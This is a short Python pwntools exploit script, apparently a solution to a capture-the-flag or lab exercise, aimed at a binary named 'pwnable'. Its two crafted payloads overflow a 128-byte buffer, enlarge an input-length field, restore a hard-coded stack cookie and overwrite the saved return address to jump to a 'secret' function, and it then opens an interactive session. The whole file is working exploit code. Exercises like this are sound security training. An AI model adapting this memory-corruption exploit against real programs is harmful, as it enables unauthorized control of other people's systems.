import pwn, sys

BINARY_PATH = "./exp-3-2/bin/pwnable"
BINARY = pwn.ELF(BINARY_PATH)
secret = BINARY.symbols['secret']

if "online" in sys.argv:
    c = pwn.connect("localhost", 1343)
elif "gdb" in sys.argv:
    c = pwn.gdb.debug(BINARY_PATH, f"""
    b* {hex(secret)}
    c
    """)
else:
    c = pwn.process(BINARY_PATH)

cookie = 0x1fbffa8f

c.clean()
c.send(pwn.flat([
    b"A" * 128,         # fill buffer
    b"B" * 16,          # padding + overwrite running to something > 1 to keep running
    pwn.p64(0xffff)     # overwrite input len to a value large enough so we can overflow the return address
]))

c.clean()
c.sendline(pwn.flat([
    b"A" * 128,         # fill buffer
    pwn.p64(0) * 3,     # padding + set running 0 to stop loop and return from func
    pwn.p64(cookie),    # set correct "cookie"
    b"B" * 8,           # rbp
    pwn.p64(secret) * 8 # rip = secret
]))

c.interactive()